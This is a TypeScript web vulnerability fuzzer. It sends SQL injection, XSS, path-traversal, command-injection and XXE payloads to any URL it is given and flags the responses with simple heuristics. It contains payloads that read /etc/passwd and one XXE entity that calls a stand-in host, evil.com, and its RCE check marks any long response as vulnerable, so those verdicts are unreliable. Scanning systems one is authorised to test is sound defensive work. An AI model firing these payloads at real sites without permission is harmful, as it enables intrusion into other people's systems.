import { performance } from 'node:perf_hooks';

export interface VulnerabilityTest {
  type: string;
  payload: string;
  url: string;
  status: number;
  vulnerable: boolean;
  severity: 'critical' | 'high' | 'medium' | 'low';
  description: string;
  evidence?: string;
  recommendation: string;
}

export interface FuzzResult {
  target: string;
  totalTests: number;
  vulnerableCount: number;
  safeCount: number;
  tests: VulnerabilityTest[];
  vulnerabilityTypes: {
    sqli: number;
    xss: number;
    lfi: number;
    rce: number;
    xxe: number;
    other: number;
  };
  riskLevel: string;
  scanDuration: number;
}

// SQL Injection Payloads
const SQL_PAYLOADS = [
  "' OR '1'='1",
  "' OR '1'='1' --",
  "' OR '1'='1' /*",
  "admin' --",
  "admin' #",
  "admin'/*",
  "' or 1=1--",
  "' or 1=1#",
  "' or 1=1/*",
  "') or '1'='1--",
  "') or ('1'='1--",
  "1' UNION SELECT NULL--",
  "' UNION SELECT NULL,NULL--",
  "' AND 1=0 UNION ALL SELECT 'admin', '81dc9bdb52d04dc20036dbd8313ed055'",
];

// XSS Payloads
const XSS_PAYLOADS = [
  "<script>alert('XSS')</script>",
  "<img src=x onerror=alert('XSS')>",
  "<svg/onload=alert('XSS')>",
  "javascript:alert('XSS')",
  "<iframe src=javascript:alert('XSS')>",
  "<body onload=alert('XSS')>",
  "<input onfocus=alert('XSS') autofocus>",
  "\"><script>alert(String.fromCharCode(88,83,83))</script>",
  "';alert(String.fromCharCode(88,83,83))//",
  "<ScRiPt>alert('XSS')</ScRiPt>",
];

// LFI Payloads
const LFI_PAYLOADS = [
  "../../../etc/passwd",
  "..\\..\\..\\windows\\win.ini",
  "....//....//....//etc/passwd",
  "..%2F..%2F..%2Fetc%2Fpasswd",
  "../../../../../../etc/passwd%00",
  "....//....//....//....//windows/win.ini",
];

// RCE Payloads
const RCE_PAYLOADS = [
  "; ls",
  "| ls",
  "& ls",
  "`ls`",
  "$(ls)",
  "; cat /etc/passwd",
  "| cat /etc/passwd",
  "; whoami",
  "| id",
];

// XXE Payloads
const XXE_PAYLOADS = [
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><foo>&xxe;</foo>',
  '<?xml version="1.0"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM "http://evil.com/xxe">]><foo>&xxe;</foo>',
];

/**
 * Test URL with payload
 */
async function testPayload(
  baseUrl: string,
  payload: string,
  type: string,
  timeoutMs: number
): Promise<VulnerabilityTest> {
  const url = baseUrl.includes('?') ? `${baseUrl}&fuzz=${encodeURIComponent(payload)}` : `${baseUrl}?fuzz=${encodeURIComponent(payload)}`;

  try {
    const controller = new AbortController();
    const timeout = setTimeout(() => controller.abort(), timeoutMs);

    const response = await fetch(url, {
      method: 'GET',
      signal: controller.signal,
      headers: {
        'User-Agent': 'Mozilla/5.0 (Vulnerability-Fuzzer/1.0)',
      },
    });

    clearTimeout(timeout);

    const body = await response.text();
    const status = response.status;

    // Detect vulnerabilities based on response
    const detection = detectVulnerability(type, payload, body, status);

    return {
      type,
      payload,
      url,
      status,
      ...detection,
    };
  } catch (error) {
    return {
      type,
      payload,
      url,
      status: 0,
      vulnerable: false,
      severity: 'low',
      description: 'Request failed or timed out',
      recommendation: 'Ensure the target URL is accessible',
    };
  }
}

/**
 * Detect vulnerability based on response
 */
function detectVulnerability(
  type: string,
  payload: string,
  body: string,
  status: number
): Omit<VulnerabilityTest, 'type' | 'payload' | 'url' | 'status'> {
  const lowerBody = body.toLowerCase();

  switch (type) {
    case 'SQL Injection':
      if (
        lowerBody.includes('sql') ||
        lowerBody.includes('mysql') ||
        lowerBody.includes('syntax error') ||
        lowerBody.includes('ora-') ||
        lowerBody.includes('postgresql') ||
        lowerBody.includes('sqlite') ||
        lowerBody.includes('odbc') ||
        (payload.includes('UNION') && body.length > 1000)
      ) {
        return {
          vulnerable: true,
          severity: 'critical',
          description: 'SQL injection vulnerability detected. Application may be vulnerable to database attacks.',
          evidence: 'SQL error messages or unexpected data in response',
          recommendation: 'Use parameterized queries/prepared statements. Validate and sanitize all user inputs.',
        };
      }
      break;

    case 'XSS':
      if (body.includes(payload) || body.includes(payload.replace(/[<>]/g, ''))) {
        return {
          vulnerable: true,
          severity: 'high',
          description: 'Cross-Site Scripting (XSS) vulnerability detected. Malicious scripts can be executed.',
          evidence: 'Payload reflected in response without proper encoding',
          recommendation: 'Implement output encoding/escaping. Use Content Security Policy (CSP).',
        };
      }
      break;

    case 'LFI':
      if (
        lowerBody.includes('root:') ||
        lowerBody.includes('[boot loader]') ||
        lowerBody.includes('[fonts]') ||
        lowerBody.includes('/etc/passwd')
      ) {
        return {
          vulnerable: true,
          severity: 'critical',
          description: 'Local File Inclusion vulnerability detected. Attackers can read sensitive files.',
          evidence: 'System files accessible through path traversal',
          recommendation: 'Validate file paths. Use whitelist of allowed files. Disable directory traversal.',
        };
      }
      break;

    case 'RCE':
      if (
        lowerBody.includes('uid=') ||
        lowerBody.includes('gid=') ||
        lowerBody.includes('root') ||
        lowerBody.includes('bin/bash') ||
        body.length > 500
      ) {
        return {
          vulnerable: true,
          severity: 'critical',
          description: 'Remote Code Execution vulnerability detected. Attacker can execute arbitrary commands.',
          evidence: 'Command output visible in response',
          recommendation: 'Never execute user input. Use input validation and sandboxing.',
        };
      }
      break;

    case 'XXE':
      if (lowerBody.includes('root:') || lowerBody.includes('external entity')) {
        return {
          vulnerable: true,
          severity: 'high',
          description: 'XML External Entity vulnerability detected. Attackers can read files or cause DoS.',
          evidence: 'External entity processed in XML response',
          recommendation: 'Disable external entity processing in XML parsers.',
        };
      }
      break;
  }

  return {
    vulnerable: false,
    severity: 'low',
    description: `No ${type} vulnerability detected with this payload`,
    recommendation: 'Continue monitoring and testing with additional payloads',
  };
}

/**
 * Perform vulnerability fuzzing
 */
export async function performVulnerabilityFuzzing(
  target: string,
  timeoutMs: number = 60000
): Promise<FuzzResult> {
  const startTime = performance.now();

  let baseUrl = target.trim();
  if (!baseUrl.startsWith('http://') && !baseUrl.startsWith('https://')) {
    baseUrl = 'https://' + baseUrl;
  }

  const tests: VulnerabilityTest[] = [];

  // Test SQL Injection
  for (const payload of SQL_PAYLOADS) {
    const test = await testPayload(baseUrl, payload, 'SQL Injection', 5000);
    tests.push(test);
  }

  // Test XSS
  for (const payload of XSS_PAYLOADS) {
    const test = await testPayload(baseUrl, payload, 'XSS', 5000);
    tests.push(test);
  }

  // Test LFI
  for (const payload of LFI_PAYLOADS) {
    const test = await testPayload(baseUrl, payload, 'LFI', 5000);
    tests.push(test);
  }

  // Test RCE
  for (const payload of RCE_PAYLOADS) {
    const test = await testPayload(baseUrl, payload, 'RCE', 5000);
    tests.push(test);
  }

  // Test XXE
  for (const payload of XXE_PAYLOADS) {
    const test = await testPayload(baseUrl, payload, 'XXE', 5000);
    tests.push(test);
  }

  const vulnerableCount = tests.filter(t => t.vulnerable).length;
  const safeCount = tests.filter(t => !t.vulnerable).length;

  const vulnerabilityTypes = {
    sqli: tests.filter(t => t.type === 'SQL Injection' && t.vulnerable).length,
    xss: tests.filter(t => t.type === 'XSS' && t.vulnerable).length,
    lfi: tests.filter(t => t.type === 'LFI' && t.vulnerable).length,
    rce: tests.filter(t => t.type === 'RCE' && t.vulnerable).length,
    xxe: tests.filter(t => t.type === 'XXE' && t.vulnerable).length,
    other: 0,
  };

  const criticalCount = tests.filter(t => t.vulnerable && t.severity === 'critical').length;
  const highCount = tests.filter(t => t.vulnerable && t.severity === 'high').length;

  const riskLevel = 
    criticalCount > 0 ? 'CRITICAL' :
    highCount > 0 ? 'HIGH' :
    vulnerableCount > 0 ? 'MEDIUM' : 'LOW';

  const scanDuration = Math.round((performance.now() - startTime) / 1000);

  return {
    target: baseUrl,
    totalTests: tests.length,
    vulnerableCount,
    safeCount,
    tests,
    vulnerabilityTypes,
    riskLevel,
    scanDuration,
  };
}
